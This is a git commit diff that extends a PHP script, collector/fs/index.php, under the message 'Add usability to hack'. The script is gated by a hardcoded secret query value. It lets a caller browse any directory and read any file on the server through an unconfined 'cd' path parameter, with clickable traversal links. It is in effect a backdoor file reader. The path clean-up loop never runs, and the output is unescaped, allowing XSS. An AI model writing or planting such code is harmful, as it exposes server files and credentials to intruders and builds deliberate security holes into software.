ec05d6eb75b76ac0faa512174ff1631cdbab5b7c
Andrii Kirmas <kirmas@phystech.edu>
2019-01-11 14:25:27 +0200

    Add usability to hack

--- collector/fs/index.php
+++ collector/fs/index.php
@@ -1,12 +1,30 @@
 <?php
 if ($_GET['salt'] != 'WtsMVFHjj53PmE07') die;
-$path = realpath(__DIR__.'/'.$_GET['cd']);
-echo "$path<br>";
+$cd = $_GET['cd'];
+$cd = str_replace('/./', '/', $cd);
+$cd = preg_replace('%/$%', '', $cd);
+$len = strlen($cd);
+while ($len !== strlen($cd)) {
+  $len = strlen($cd);
+  $cd = preg_replace('%[^/\]+/..(/|$)%', '', $cd);
+}
+$path = realpath(__DIR__.'/'.$cd);
 if (!file_exists($path)) {
   echo "not exists";
   die;
 }
 
-if (is_dir($path)) echo join("<br>", scandir($path));
+if (is_dir($path)) echo join("<br>",
+  array_map(
+    function ($file) use ($cd) {
+      return "<a href=\""
+      .$_SERVER['SCRIPT_NAME']
+      ."?cd=$cd/$file&salt="
+      .$_GET['salt']
+      ."\">$file</a>";
+    },
+    scandir($path)
+  )
+);
 else echo file_get_contents($path);
 die;
